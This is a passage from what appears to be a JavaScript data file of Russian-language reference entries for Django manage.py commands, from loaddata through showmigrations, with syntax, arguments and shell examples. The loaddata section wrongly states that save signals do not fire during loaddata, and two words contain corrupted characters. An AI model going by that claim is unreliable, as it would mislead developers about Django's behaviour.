$ python manage.py loaddata full_dump.json \\
    --exclude contenttypes \\
    --exclude auth.permission

# Формат фикстуры (JSON):
[
    {
        "model": "blog.category",
        "pk": 1,
        "fields": {
            "name": "Технологии",
            "slug": "tech"
        }
    },
    {
        "model": "blog.article",
        "pk": 1,
        "fields": {
            "title": "Введение в Django",
            "category": 1,
            "author": ["admin@example.com"]    // natural key для FK
        }
    }
]

# Формат с natural keys (если фикстура была создана с --natural-foreign):
[
    {
        "model": "contenttypes.contenttype",
        "fields": {"app_label": "blog", "model": "article"}
    }
]

# Использование в тестах
class BlogTest(TestCase):
    fixtures = ['categories.json', 'sample_articles.json']
    # Django вызовет loaddata перед каждым тестом класса.
    # Файлы ищутся в <app>/fixtures/.

# В миграции через RunPython
from django.core.management import call_command
def load_initial(apps, schema_editor):
    call_command('loaddata', 'initial_categories', app_label='blog')

class Migration(migrations.Migration):
    operations = [migrations.RunPython(load_initial, reverse_code=migrations.RunPython.noop)]

# Транзакционность:
# Все объекты из всех указанных фикстур грузятся в ОДНОЙ транзакции.
# Ошибка в любой → откат всего, БД остаётся как была.
# Большие фикстуры (миллионы строк) → риск долгой блокировки и OOM.
# Для больших дампов — лучше pg_restore/mysql import.

# Pre/post save сигналы НЕ срабатывают при loaddata
# (используется raw=True в save). Это критично для пользовательских
# полей с авто-вычислениями — они не сработают, нужно дублировать в фикстуре.`,
  },
  {
    name: "makemessages",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py makemessages — сканирует исходники проекта на наличие строк, отмеченных для перевода (gettext, gettext_lazy, _(), {% trans %}, {% blocktrans %}), и генерирует/обновляет .po-файлы для указанных языков. Это первый этап i18n-цикла; после правки .po вручную (или через Weblate/POEdit) нужен compilemessages для создания бинарных .mo. По умолчанию обрабатывает .py, .html, .txt; через --extension добавляются другие. Требует установленного xgettext (часть пакета gettext).",
    syntax:
      "manage.py makemessages [--all] [--extension EXTENSIONS] [--locale LOCALE] [--exclude EXCLUDE] [--domain DOMAIN] [--symlinks] [--ignore PATTERN] [--no-default-ignore] [--no-wrap] [--no-location] [--add-location {full,file,never}] [--no-obsolete] [--keep-pot]",
    arguments: [
      {
        name: "--all, -a",
        description:
          "Обновить .po-файлы для ВСЕХ существующих локалей в проекте. Удобно после массовой правки исходников. Несовместимо с --locale.",
      },
      {
        name: "--extension EXTENSIONS, -e EXTENSIONS",
        description:
          "Дополнительные расширения файлов для сканирования (через запятую или повторяющийся флаг). По умолчанию: html, txt, py. Например: -e html,txt,jinja для шаблонов Jinja.",
      },
      {
        name: "--locale LOCALE, -l LOCALE",
        description:
          "Создать/обновить .po для указанной локали (ru, en_GB, de_AT). Можно повторять для нескольких. Если каталога нет, будет создан.",
      },
      {
        name: "--exclude EXCLUDE, -x EXCLUDE",
        description:
          "Локаль, которую НЕ обновлять при использовании --all. Полезно для исключения экспериментальных языков.",
      },
      {
        name: "--domain DOMAIN, -d DOMAIN",
        description:
          "Домен переводов: django (по умолчанию, для UI и шаблонов) или djangojs (для JavaScript-переводов через django.views.i18n.JavaScriptCatalog). Создаёт django.po или djangojs.po.",
      },
      {
        name: "--symlinks, -s",
        description:
          "Следовать символическим ссылкам при сканировании каталогов. По умолчанию игнорируются.",
      },
      {
        name: "--ignore PATTERN, -i PATTERN",
        description:
          "Glob-паттерн файлов/каталогов для пропуска при сканировании. Можно повторять. По умолчанию игнорируются CVS, .*, *~, *.pyc.",
      },
      {
        name: "--no-default-ignore",
        description:
          "Не использовать список игнорируемых по умолчанию (CVS, .*, *~, *.pyc). Нужен только в специфических случаях, обычно не используется.",
      },
      {
        name: "--no-wrap",
        description:
          "Не переносить длинные строки в .po-файле (msgid/msgstr остаются в одну строку). Удобно для git-diff: убирает шум от переноса при незначительных правках.",
      },
      {
        name: "--no-location",
        description:
          'Не добавлять комментарии "#: file.py:42" с указанием места использования строки. Уменьшает diff при рефакторинге, но затрудняет переводчику поиск контекста.',
      },
      {
        name: "--add-location [{full,file,never}]",
        description:
          "Уровень детализации location-комментариев. full (по умолчанию) — файл и строка, file — только файл, never — без location (эквивалент --no-location). Доступно с Django 2.2.",
      },
      {
        name: "--no-obsolete",
        description:
          "Не сохранять в .po устаревшие переводы (помечаются как #~ msgid). По умолчанию сохраняются — позволяют переиспользовать перевод при возврате удалённой строки.",
      },
      {
        name: "--keep-pot",
        description:
          "Не удалять временный .pot-файл (POT — Portable Object Template), создаваемый xgettext. По умолчанию удаляется после генерации .po. Нужен для сторонних инструментов (Weblate, Transifex).",
      },
    ],
    example: `# Установка gettext (обязательно)
# Ubuntu/Debian: apt install gettext
# macOS:         brew install gettext
# Windows:       https://mlocati.github.io/articles/gettext-iconv-windows.html

# 1. Пометить строки для перевода в коде
# views.py
from django.utils.translation import gettext as _, gettext_lazy
from django.shortcuts import render

def home(request):
    title = _('Добро пожаловать')
    return render(request, 'home.html', {'title': title})

# models.py — для атрибутов классов всегда _lazy
class Article(models.Model):
    title = models.CharField(gettext_lazy('Заголовок'), max_length=200)

# Шаблон home.html
{% load i18n %}
<h1>{% trans "Добро пожаловать" %}</h1>
{% blocktrans with name=user.username %}
    Привет, {{ name }}!
{% endblocktrans %}

# 2. Сгенерировать .po для русского и английского
$ python manage.py makemessages -l ru -l en
processing locale ru
processing locale en
# Создаст: locale/ru/LC_MESSAGES/django.po
#         locale/en/LC_MESSAGES/django.po

# 3. Обновить ВСЕ существующие локали (после изменения исходников)
$ python manage.py makemessages --all

# Сканирование Jinja2-шаблонов
$ python manage.py makemessages -l ru -e html,txt,jinja

# Несколько расширений через запятую
$ python manage.py makemessages -l ru --extension=html,txt,py,vue

# JavaScript-переводы (отдельный домен)
$ python manage.py makemessages -d djangojs -l ru
# Создаст locale/ru/LC_MESSAGES/djangojs.po
# Затем подключить в urls.py:
# from django.views.i18n import JavaScriptCatalog
# path('jsi18n/', JavaScriptCatalog.as_view(), name='javascript-catalog')

# Игнорировать сторонние библиотеки
$ python manage.py makemessages -l ru \\
    --ignore=node_modules \\
    --ignore=venv \\
    --ignore=.tox \\
    --ignore=staticfiles

# Уменьшить шум в git-diff (для команд, чувствительных к diff)
$ python manage.py makemessages --all --no-wrap --add-location=file
# --no-wrap: длинные строки в одну строку
# --add-location=file: только файл без номеров строк

# Без location-комментариев вообще (минимальный diff)
$ python manage.py makemessages --all --no-location

# Не сохранять obsolete-переводы (чище .po, но теряются возможные восстановления)
$ python manage.py makemessages --all --no-obsolete

# Сохранить .pot-файл для Weblate/Transifex
$ python manage.py makemessages -l ru --keep-pot
# Появится locale/django.pot — шаблонный файл без переводов

# 4. Структура сгенерированного .po
# locale/ru/LC_MESSAGES/django.po
# msgid ""
# msgstr ""
# "Content-Type: text/plain; charset=UTF-8\\n"
# "Language: ru\\n"
#
# #: views.py:8
# msgid "Добро пожаловать"
# msgstr ""           ← переводчик заполняет
#
# #: models.py:5
# msgid "Заголовок"
# msgstr ""

# 5. После заполнения переводов
$ python manage.py compilemessages

# Полный CI-цикл (проверка свежести переводов):
$ python manage.py makemessages --all --no-obsolete
$ git diff --exit-code locale/    # упадёт, если в коде есть непереведённые новые строки`,
  },
  {
    name: "makemigrations",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py makemigrations — анализирует текущее состояние моделей в коде, сравнивает с последней миграцией каждого приложения и создаёт новый файл миграции с операциями (CreateModel, AddField, AlterField, RemoveField, RunSQL и т.п.) для приведения схемы к новому состоянию. Не выполняет SQL — только генерирует Python-описание изменений. Применяется командой migrate. При конфликтующих миграциях из разных веток помогает --merge.",
    syntax:
      "manage.py makemigrations [app_label [app_label ...]] [--noinput] [--empty] [--dry-run] [--merge] [--name NAME] [--no-header] [--check] [--scriptable] [--update]",
    arguments: [
      {
        name: "app_label [app_label ...]",
        description:
          "Опциональный список приложений, для которых генерировать миграции. Без аргументов сканируются все приложения из INSTALLED_APPS.",
      },
      {
        name: "--noinput, --no-input",
        description:
          "Не задавать интерактивные вопросы (например, «какое значение по умолчанию для нового NOT NULL поля?»). Если ответ требуется — команда падает. Используется в CI.",
      },
      {
        name: "--empty",
        description:
          "Создать пустую миграцию (без операций) для последующего ручного заполнения, например через RunPython или RunSQL для data migration.",
      },
      {
        name: "--dry-run",
        description:
          "Показать, что было бы сгенерировано, но не создавать файлы миграций. Полезно для проверки в CI или перед commit.",
      },
      {
        name: "--merge",
        description:
          "Создать merge-миграцию для разрешения конфликта, когда в одном приложении есть несколько последних миграций (например, после merge git-веток). Не генерирует SQL-операции, только объявляет зависимости.",
      },
      {
        name: "--name NAME, -n NAME",
        description:
          "Кастомное имя миграции (без префикса 0001_). По умолчанию Django генерирует имя из первой операции (например, 0042_alter_article_title). Полезно для семантических имён data migration.",
      },
      {
        name: "--no-header",
        description:
          "Не добавлять комментарий-заголовок «Generated by Django X.Y.Z on YYYY-MM-DD HH:MM» в начало файла. Уменьшает diff между миграциями, созданными в разное время/разными версиями Django.",
      },
      {
        name: "--check",
        description:
          "Завершиться с ненулевым exit-кодом, если есть несгенерированные миграции (модели изменены, но makemigrations не запускали). Используется в CI для проверки, что разработчик не забыл создать миграцию.",
      },
      {
        name: "--scriptable",
        description:
          "Машиночитаемый вывод: интерактивные подсказки идут в stderr, имена сгенерированных файлов — в stdout (по одному на строку). Удобно для shell-скриптов: $(python manage.py makemigrations --scriptable).",
      },
      {
        name: "--update",
        description:
          "Не создавать новый файл миграции, а обновить последнюю. Полезно, когда после первичной генерации внесли мелкую правку в модель и не хотите плодить миграции 0042, 0043 на одну фичу. Доступно с Django 4.1.",
      },
    ],
    example: `# Базовое использование — генерация миграций для всех изменений
$ python manage.py makemigrations
Migrations for 'blog':
  blog/migrations/0042_article_views.py
    - Add field views to article

# Только для конкретного приложения
$ python manage.py makemigrations blog

# С кастомным именем
$ python manage.py makemigrations blog --name add_views_counter
# Создаст 0042_add_views_counter.py вместо 0042_article_views.py

# Пустая миграция для data migration
$ python manage.py makemigrations blog --empty --name backfill_slugs
# Создаст пустую миграцию, заполняем вручную:

# blog/migrations/0043_backfill_slugs.py
from django.db import migrations
from django.utils.text import slugify

def backfill(apps, schema_editor):
    Article = apps.get_model('blog', 'Article')
    for article in Article.objects.filter(slug=''):
        article.slug = slugify(article.title)
        article.save(update_fields=['slug'])

class Migration(migrations.Migration):
    dependencies = [('blog', '0042_article_slug')]
    operations = [migrations.RunPython(backfill, reverse_code=migrations.RunPython.noop)]

# Проверка перед commit (что будет сгенерировано)
$ python manage.py makemigrations --dry-run --verbosity=2

# В CI — проверка, что разработчик не забыл миграции
- name: Check migrations
  run: python manage.py makemigrations --check --dry-run
# Падает, если модели изменены, но миграция не создана.

# Разрешение конфликта merge
# После git merge оказалось:
#   blog/migrations/
#     0042_add_views.py        (из main)
#     0042_add_likes.py        (из feature-ветки)
$ python manage.py makemigrations --merge
Merging blog
  Branch 0042_add_views
    - Add field views to article
  Branch 0042_add_likes
    - Add field likes to article
Created blog/migrations/0043_merge_20260429_1430.py

# Без интерактива (CI)
$ python manage.py makemigrations --noinput
# Если требуется значение по умолчанию для нового NOT NULL поля → падение.
# Решение: добавить default= в модель или сделать поле nullable.

# Обновить последнюю миграцию вместо создания новой (Django 4.1+)
# Сценарий: создал 0042_article_slug, заметил что забыл db_index=True
$ python manage.py makemigrations --update
# Перегенерирует 0042 с обновлённой версией модели, не создавая 0043.
# ВАЖНО: только если 0042 ещё не применена на других серверах/в общем репо.

# Машиночитаемый режим для скриптов
$ FILES=$(python manage.py makemigrations --scriptable)
$ echo "Created: $FILES"
$ git add $FILES

# Без header-комментария
$ python manage.py makemigrations --no-header
# Полезно для воспроизводимых сборок и уменьшения git-шума.

# Что НЕ умеет makemigrations:
#   - Угадывать переименование поля при одинаковом типе (спрашивает интерактивно)
#   - Угадывать переименование модели (спрашивает)
#   - Создавать data migration (только schema; для данных — --empty + RunPython)
#   - Учитывать managed=False модели (игнорируются)`,
  },
  {
    name: "migrate",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py migrate — применяет (или откатывает) миграции в БД, синхронизируя её схему с описанием в Python. Без аргументов применяет все непримененные миграции для всех приложений. Может применить миграции до конкретной точки, откатить через указание более старого имени, выполнить «фейковую» миграцию (отметить применённой без выполнения SQL). Записи об применённых миграциях хранятся в таблице django_migrations.",
    syntax:
      "manage.py migrate [app_label] [migration_name] [--database DATABASE] [--fake] [--fake-initial] [--plan] [--run-syncdb] [--noinput] [--check] [--prune]",
    arguments: [
      {
        name: "app_label",
        description:
          "Опциональное имя приложения, миграции которого применять. Без него обрабатываются все приложения.",
      },
      {
        name: "migration_name",
        description:
          'Опциональное имя конкретной миграции (например, "0042" или "0042_add_views" или "zero" для отката всех). При указании Django применит/откатит миграции до этой точки.',
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES, в которую применять миграции. По умолчанию default. Для каждой БД миграции запускаются отдельно (с учётом DATABASE_ROUTERS.allow_migrate).",
      },
      {
        name: "--fake",
        description:
          "Отметить миграции как применённые в django_migrations, но не выполнять SQL. Используется, если изменения уже применены вручную (например, когда схема создана до Django).",
      },
      {
        name: "--fake-initial",
        description:
          "Для каждой initial-миграции (0001_initial.py) сначала проверить, существуют ли уже её таблицы. Если да — отметить применённой без выполнения. Используется при подключении Django к БД с уже существующей схемой.",
      },
      {
        name: "--plan",
        description:
          "Показать план миграций (что будет применено и в каком порядке) без выполнения. Удобно для ревью и предсказания эффекта перед production-релизом.",
      },
      {
        name: "--run-syncdb",
        description:
          "Создать таблицы для приложений без миграций (managed=True модели в приложении без папки migrations/). Устаревшая практика — все приложения должны иметь миграции.",
      },
      {
        name: "--noinput, --no-input",
        description:
          "Не задавать интерактивные вопросы. Если требуется ответ (например, при удалении модели) — команда падает. Обязательно для CI/деплоя.",
      },
      {
        name: "--check",
        description:
          "Завершиться с ненулевым exit-кодом, если есть непримененные миграции, и НЕ выполнять их. Полезно в CI для проверки актуальности БД перед запуском тестов.",
      },
      {
        name: "--prune",
        description:
          "Удалить из django_migrations записи о миграциях, которых больше нет в коде (например, после удаления приложения). По умолчанию такие записи остаются как «висящие». Доступно с Django 4.2.",
      },
    ],
    example: `# Применить все непримененные миграции (стандартный деплой-шаг)
$ python manage.py migrate
Operations to perform:
  Apply all migrations: admin, auth, blog, contenttypes, sessions
Running migrations:
  Applying blog.0042_article_views... OK

# Только конкретное приложение
$ python manage.py migrate blog

# До конкретной миграции (вперёд или назад)
$ python manage.py migrate blog 0040
# Если 0042 применена, а нужно откатиться к 0040 — откатит 0041, 0042.
# ЕслѸ применена 0038 — применит 0039, 0040.

# Откат ВСЕХ миграций приложения
$ python manage.py migrate blog zero
# Удалит все таблицы blog. Используется при удалении приложения.

# План перед применением (для ревью)
$ python manage.py migrate --plan
Planned operations:
blog.0042_article_views
    Add field views to article
blog.0043_alter_article_status
    Alter field status on article
# В CI или перед production:
$ python manage.py migrate --plan | tee migration_plan.txt

# Проверка состояния миграций (без применения)
$ python manage.py migrate --check
# Exit 0 — все миграции применены
# Exit 1 — есть непримененные

# Fake-миграция (схема уже применена вручную)
$ python manage.py migrate blog 0042 --fake
# Запишет 0042 в django_migrations, но не выполнит SQL.
# Сценарий: вручную сделали ALTER TABLE, теперь нужно «успокоить» Django.

# Подключение к существующей БД с готовой схемой
$ python manage.py migrate --fake-initial
# Для каждого приложения: если таблицы из 0001_initial уже есть → отметить как применённую.

# В конкретную БД (multi-DB сценарий)
$ python manage.py migrate --database=replica

# В деплое (без интерактива)
$ python manage.py migrate --noinput

# Удалить устаревшие записи в django_migrations (Django 4.2+)
# Сценарий: удалили приложение oldapp, его записи остались в django_migrations
$ python manage.py migrate --prune oldapp

# Полный production deploy script
#!/bin/bash
set -e
python manage.py migrate --check || {
    python manage.py migrate --plan
    python manage.py migrate --noinput
}
python manage.py collectstatic --noinput
python manage.py compilemessages

# Что делает Django при migrate:
# 1. Читает django_migrations — какие миграции уже применены.
# 2. Строит граф зависимостей миграций из всех приложений.
# 3. Определяет план: какие применить и в каком порядке.
# 4. Для каждой миграции:
#    a. BEGIN транзакция (если backend поддерживает DDL в транзакции)
#    b. Выполняет операции (CreateModel, AddField и т.п.)
#    c. INSERT в django_migrations
#    d. COMMIT
# 5. Отправляет сигнал post_migrate (создаёт ContentType, Permission).

# Транзакционность DDL по бэкендам:
#   PostgreSQL  — да, миграция атомарна
#   SQLite      — да (большинство операций)
#   Oracle      — да
#   MySQL/MariaDB — НЕТ для DDL — при ошибке БД может остаться в полусломанном состоянии

# Откат — обратные операции
# Каждая операция миграции имеет database_backwards.
# RunPython требует reverse_code (или явный noop).
# Не все операции обратимы (RunSQL без reverse_sql, RemoveField без хранения данных).

# Прогресс длинных миграций
$ python manage.py migrate --verbosity=2
# Покажет каждую SQL-команду в реальном времени.`,
  },
  {
    name: "optimizemigration",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py optimizemigration (Django 4.1+) — переписывает указанную миграцию, объединяя её операции через MigrationOptimizer. Например, последовательность CreateModel + AddField + AlterField сворачивается в один CreateModel с финальным набором полей. Полезна после squashmigrations для дополнительной оптимизации, или после ручной правки миграции с избыточными операциями. Не меняет историю django_migrations и не влияет на уже применённые миграции — только переписывает файл.",
    syntax: "manage.py optimizemigration app_label migration_name [--check]",
    arguments: [
      {
        name: "app_label",
        description:
          "Метка приложения, миграцию которого оптимизировать (обязательно).",
      },
      {
        name: "migration_name",
        description:
          'Имя миграции для оптимизации — без префикса 0001_ можно (например "0001_initial" или "0001"). Обязательный аргумент.',
      },
      {
        name: "--check",
        description:
          "Завершиться с ненулевым exit-кодом, если миграция МОЖЕТ быть оптимизирована (но не переписывать файл). Используется в CI для напоминания об оптимизации после крупных правок.",
      },
    ],
    example: `# Сценарий: после squashmigrations
$ python manage.py squashmigrations blog 0001 0042
Will squash the following migrations:
 - 0001_initial
 - 0002_add_category
 - ...
 - 0042_article_views
Created new squashed migration /apps/blog/migrations/0001_squashed_0042_article_views.py

# Squash объединяет файлы, но операции внутри могут остаться избыточными:
# operations = [
#     migrations.CreateModel(name='Article', fields=[('id', ...), ('title', ...)]),
#     migrations.AddField('article', 'slug', ...),
#     migrations.AlterField('article', 'title', max_length=300),  # было 200
#     migrations.AddField('article', 'views', models.IntegerField(default=0)),
# ]

# Оптимизация — свернёт всё в один CreateModel
$ python manage.py optimizemigration blog 0001_squashed_0042_article_views
Optimizing... Optimized from 4 operations to 1 operation.
# Файл переписан:
# operations = [
#     migrations.CreateModel(name='Article', fields=[
#         ('id', ...),
#         ('title', models.CharField(max_length=300)),
#         ('slug', models.SlugField()),
#         ('views', models.IntegerField(default=0)),
#     ]),
# ]

# Без полного имени — можно по номеру
$ python manage.py optimizemigration blog 0001

# В CI — проверить, что миграции в оптимальной форме
$ python manage.py optimizemigration blog 0001_squashed --check
# Exit 0 — оптимизация не нужна
# Exit 1 — миграция может быть оптимизирована (предложить разработчику запустить без --check)

# Что умеет MigrationOptimizer:
#   CreateModel + AddField   → CreateModel с добавленным полем
#   CreateModel + AlterField → CreateModel с финальным определением поля
#   AddField + RemoveField   → удаление обоих (поле было добавлено и удалено в той же миграции)
#   AddField + AlterField    → AddField с финальным определением
#   CreateModel + DeleteModel → удаление обоих
#   AlterField + AlterField  → одна AlterField с финальным определением

# Что НЕ оптимизирует:
#   - RunPython, RunSQL — никогда не сворачивает (x�одержат произвольный код)
#   - Операции через границу зависимостей других приложений
#   - Операции, разделённые SeparateDatabaseAndState

# Когда применять optimizemigration:
# 1. Сразу после squashmigrations
# 2. После ручного редактирования миграции с дублирующимися операциями
# 3. В период «зачистки» репозитория перед мажорным релизом
# 4. НЕ для уже применённых на других серверах миграций — это создаст несоответствие
#    хеша операций (в django_migrations хранится только имя, но коллеги могут получить
#    discrepancy при reverse-миграциях, если файл изменился)

# Безопасность: optimizemigration создаёт ту же финальную схему, что и оригинал.
# Применение оптимизированной миграции с нуля даёт идентичный результат.
# Но если миграция уже применена — Django не перезапускает её (запись по имени),
# поэтому оптимизация безопасна для будущих fresh-инсталляций.`,
  },
  {
    name: "runserver",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py runserver — запускает встроенный лёгкий веб-сервер разработки. По умолчанию слушает 127.0.0.1:8000. Автоматически перезагружается при изменении файлов проекта (StatReloader/WatchmanReloader), отдаёт static-файлы при DEBUG=True. Не предназначен для продакшна — однопоточный по умолчанию для упрощения отладки, не оптимизирован по производительности и безопасности. Требует, чтобы хост был указан в ALLOWED_HOSTS, либо использовался localhost/0.0.0.0 в режиме DEBUG.",
    syntax:
      "manage.py runserver [addrport] [--noreload] [--nothreading] [--ipv6/-6]",
    arguments: [
      {
        name: "addrport",
        description:
          'Опциональный адрес и/или порт в формате "[ADDR:]PORT". Можно указать только порт ("8080"), только хост ("0.0.0.0:8000") или оба. По умолчанию 127.0.0.1:8000. Для доступа из локальной сети используйте 0.0.0.0:8000.',
      },
      {
        name: "--noreload",
        description:
          "Отключить автоматический перезапуск сервера при изменении исходных файлов. Полезно при отладке через pdb/ipdb (без --noreload отладчик «теряется» при перезагрузке) и для уменьшения нагрузки на CPU/файловую систему.",
      },
      {
        name: "--nothreading",
        description:
          "Отключить многопоточный режим — каждый запрос обрабатывается строго последовательно. Полезно при отладке гонок и проблем с не-thread-safe кодом, а также если требуется чисто WSGI-однопоточное поведение.",
      },
      {
        name: "--ipv6, -6",
        description:
          "Использовать IPv6 для адреса по умолчанию (::1 вместо 127.0.0.1). При явно указанном addrport влияет только на трактовку формата адреса.",
      },
    ],
    example: `# Стандартный запуск на 127.0.0.1:8000
$ python manage.py runserver
Watching for file changes with StatReloader
Performing system checks...
System check identified no issues (0 silenced).
Django version 5.0, using settings 'myproject.settings'
Starting development server at http://127.0.0.1:8000/
Quit the server with CONTROL-C.

# Только порт
$ python manage.py runserver 8080

# Доступ из локальной сети (телефон, виртуалка)
$ python manage.py runserver 0.0.0.0:8000
# settings.py
ALLOWED_HOSTS = ['*']  # только для DEV!

# Отладка с pdb — без перезагрузки
$ python manage.py runserver --noreload
# в коде:
import pdb; pdb.set_trace()

# Однопоточный режим (для отладки race conditions)
$ python manage.py runserver --nothreading

# IPv6
$ python manage.py runserver --ipv6
# Starting development server at http://[::1]:8000/

# Запуск на нестандартном хосте + IPv6
$ python manage.py runserver [::]:8080

# ВНИМАНИЕ: НИКОГДА не использовать в продакшне.
# Для боевого окружения — gunicorn/uvicorn/uWSGI:
$ gunicorn myproject.wsgi:application --bind 0.0.0.0:8000 --workers 4
$ uvicorn myproject.asgi:application --host 0.0.0.0 --port 8000`,
  },
  {
    name: "sendtestemail",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py sendtestemail — отправляет тестовое письмо через текущий email-бэкенд (EMAIL_BACKEND), чтобы проверить корректность настроек SMTP/SES/SendGrid и т. п. Полезна при первичной настройке почты, диагностике проблем доставки и в CI после изменения настроек. Тема письма содержит timestamp, тело — диагностическую информацию.",
    syntax:
      "manage.py sendtestemail [email [email ...]] [--managers] [--admins]",
    arguments: [
      {
        name: "email [email ...]",
        description:
          "Список email-адресов получателей. Можно указать несколько через пробел. Если не указан, должен быть задан хотя бы один из флагов --managers или --admins.",
      },
      {
        name: "--managers",
        description:
          "Отправить письмо всем адресатам из настройки MANAGERS в settings.py. Используется для проверки настроек оповещений менеджеров.",
      },
      {
        name: "--admins",
        description:
          "Отправить письмо всем адресатам из настройки ADMINS в settings.py. Используется для проверки настроек оповещений администраторов (отчёты об ошибках 500 в продакшне).",
      },
    ],
    example: `# Отправка одному адресату
$ python manage.py sendtestemail user@example.com
Test email from hostname.local on 2024-12-31 12:34:56.789012+00:00

# Несколько получателей
$ python manage.py sendtestemail dev@example.com qa@example.com

# Отправка всем менеджерам из settings.MANAGERS
$ python manage.py sendtestemail --managers

# Отправка всем администраторам
$ python manage.py sendtestemail --admins

# Комбинация — менеджеры + явные адреса
$ python manage.py sendtestemail extra@example.com --managers --admins

# Типичные настройки SMTP в settings.py
EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
EMAIL_HOST = 'smtp.gmail.com'
EMAIL_PORT = 587
EMAIL_USE_TLS = True
EMAIL_HOST_USER = 'noreply@example.com'
EMAIL_HOST_PASSWORD = os.environ['EMAIL_PASSWORD']
DEFAULT_FROM_EMAIL = 'Сервис <noreply@example.com>'
SERVER_EMAIL = 'errors@example.com'  # отправитель писем ADMINS

ADMINS = [('Иван', 'ivan@example.com')]
MANAGERS = [('Поддержка', 'support@example.com')]

# Отладка — вывод в консоль вместо реальной отправки
EMAIL_BACKEND = 'django.core.mail.backends.console.EmailBackend'
$ python manage.py sendtestemail test@example.com
# Содержимое письма выводится в stdout

# Проверка после смены провайдера (например, переезд на SendGrid)
$ EMAIL_BACKEND=django.core.mail.backends.smtp.EmailBackend \\
  python manage.py sendtestemail you@example.com
# Если письмо не пришло:
#   - проверить EMAIL_HOST/PORT/USE_TLS/USE_SSL
#   - проверить SPF/DKIM/DMARC записи домена
#   - проверить логи провайдера (отказ, отбракованный получатель)`,
  },
  {
    name: "shell",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py shell — запускает интерактивный Python-интерпретатор внутри окружения Django (с настроенным DJANGO_SETTINGS_MODULE и инициализированным реестром приложений). Можно сразу импортировать модели и выполнять ORM-запросы. Поддерживает несколько бэкендов: ipython (богатый REPL), bpython (компактный с автодополнением), стандартный python (всегда доступен как fallback).",
    syntax:
      "manage.py shell [-i {ipython,bpython,python}] [--no-startup] [--no-imports] [-c COMMAND]",
    arguments: [
      {
        name: "--interface {ipython,bpython,python}, -i",
        description:
          "Принудительно выбрать интерпретатор. По умолчанию Django пытается ipython, затем bpython, затем стандартный python. Используйте, чтобы переопределить автоопределение.",
      },
      {
        name: "--no-startup",
        description:
          "Игнорировать файл, указанный в переменной окружения PYTHONSTARTUP, и ~/.pythonrc.py. Применимо только к стандартному интерпретатору python (для чистого окружения без локальных настроек).",
      },
      {
        name: "--no-imports",
        description:
          "Не выполнять автоматический импорт моделей при старте shell (поведение, добавленное в Django 5.2). Полезно, если импорты замедляют запуск или конфликтуют с пользовательскими настройками.",
      },
      {
        name: "--command COMMAND, -c COMMAND",
        description:
          "Выполнить переданную строку Python-кода и завершиться. Удобно для скриптовых задач из CI/cron без необходимости создавать management-команду.",
      },
    ],
    example: `# Запуск интерактивного shell (ipython/bpython/python — по доступности)
$ python manage.py shell
Python 3.12.0 (main, ...) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
(InteractiveConsole)
>>> from django.contrib.auth import get_user_model
>>> User = get_user_model()
>>> User.objects.count()
42

# Принудительно стандартный python
$ python manage.py shell -i python

# Принудительно ipython
$ python manage.py shell -i ipython

# Чистое окружение без PYTHONSTARTUP
$ python manage.py shell --no-startup

# Без автоимпортов моделей (Django 5.2+)
$ python manage.py shell --no-imports

# Выполнить однострочник и выйти (вместо отдельной management-команды)
$ python manage.py shell -c "from blog.models import Post; print(Post.objects.count())"
123

# Скриптовое использование в CI/cron
$ python manage.py shell -c "
from django.contrib.auth import get_user_model
User = get_user_model()
User.objects.filter(is_active=False, last_login__isnull=True).delete()
"

# Альтернатива для сложной логики — отдельный скрипт через -c с heredoc
$ python manage.py shell <<'EOF'
from django.db.models import Count
from blog.models import Post
top = Post.objects.values('author__username').annotate(n=Count('id')).order_by('-n')[:5]
for row in top:
    print(row['author__username'], row['n'])
EOF

# Установка ipython для удобства (автодополнение, %magic)
$ pip install ipython
$ python manage.py shell        # автоматически выберет ipython

# Расширение shell_plus из django-extensions
# (автоимпорт всех моделей и часто используемых утилит)
$ pip install django-extensions
# settings.py: INSTALLED_APPS += ['django_extensions']
$ python manage.py shell_plus`,
  },
  {
    name: "showmigrations",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py showmigrations — показывает состояние миграций для всех или указанных приложений. По умолчанию выводит список миграций, отмечая применённые символом [X], не применённые — [ ]. Альтернативный режим --plan показывает порядок применения с учётом зависимостей. Применяется для аудита состояния схемы, диагностики разъехавшихся окружений и проверки очерёдности при squash/merge.",
    syntax:
      "manage.py showmigrations [app_label [app_label ...]] [--list/-l] [--plan/-p] [--database DATABASE]",
    arguments: [
      {
        name: "app_label [app_label ...]",
        description:
          "Опциональный список приложений для фильтрации. Без аргументов показывает миграции всех INSTALLED_APPS, у которых есть пакет migrations.",
      },
      {
        name: "--list, -l",
        description:
          "Формат вывода по умолчанию: список миграций по приложениям с пометкой [X] для применённых. Удобен для быстрого обзора.",
      },
      {
        name: "--plan, -p",
        description:
          "Показать миграции в порядке их фактического применения с учётом зависимостей между приложениями. Перед каждой строкой [X]/[ ]. С -v 2 показывает зависимости каждой миграции.",
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES, для которой определять состояние миграций. По умолчанию default. Используется в multi-DB проектах для проверки реплик/шардов.",
      },
    ],
    example: `# Состояние всех миграций (формат по умолчанию --list)
$ python manage.py showmigrations
admin
 [X] 0001_initial
 [X] 0002_logentry_remove_auto_add
 [X] 0003_logentry_add_action_flag_choices
auth
 [X] 0001_initial
 [X] 0002_alter_permission_name_max_length
 ...
blog
 [X] 0001_initial
 [ ] 0002_post_published
 [ ] 0003_add_index_on_slug

# Только конкретные приложения
$ python manage.py showmigrations blog auth

# План применения с учётом зависимостей
$ python manage.py showmigrations --plan
[X]  contenttypes.0001_initial
[X]  auth.0001_initial
[X]  admin.0001_initial
[X]  blog.0001_initial
[ ]  blog.0002_post_published
[ ]  blog.0003_add_index_on_slug

# С детализацией зависимостей
$ python manage.py showmigrations --plan -v 2
[ ]  blog.0002_post_published ... (blog.0001_initial)
[ ]  blog.0003_add_index_on_slug ... (blog.0002_post_published)

# В multi-DB конфигурации — проверить реплику
$ python manage.py showmigrations --database replica

# Использование в CI: убедиться, что нет неприменённых миграций
